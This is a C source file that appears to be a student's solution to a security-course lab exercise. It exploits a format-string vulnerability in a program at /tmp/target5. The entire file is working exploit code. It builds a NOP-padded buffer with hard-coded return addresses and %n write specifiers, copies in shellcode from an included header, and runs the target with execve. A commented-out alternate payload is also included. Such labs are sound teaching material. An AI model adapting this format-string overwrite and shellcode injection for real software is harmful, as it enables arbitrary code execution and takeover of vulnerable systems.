#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  int i;
  char *args[3];
  char *env[1];
  char buf[480];
  memset(buf, 0x90, 480);
  
  /* return to arg ver */
  char* tmp = 
  "\x7c\xf4\xff\xbf\xff\xff\xff\xff"
  "\x7d\xf4\xff\xbf\xff\xff\xff\xff"
  "\x7e\xf4\xff\xbf\xff\xff\xff\xff"
  "\x7f\xf4\xff\xbf\xff\xff\xff\xff"
  "%04x%08x%17u%n%189u%n%5u%n%192u%n";

  strncpy(buf,tmp,strlen(tmp));
  
  /* return to buf ver */
  // char* tmp = 
  // "\x7c\xf4\xff\xbf\xff\xff\xff\xff"
  // "\x7d\xf4\xff\xbf\xff\xff\xff\xff"
  // "\x7e\xf4\xff\xbf\xff\xff\xff\xff"
  // "\x7f\xf4\xff\xbf\xff\xff\xff\xff"
  // "%04x%08x%212u%n%244u%n%7u%n%188u%n";

  // strncpy(buf,tmp,strlen(tmp));

  strncpy(buf+400, shellcode, 45);

  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
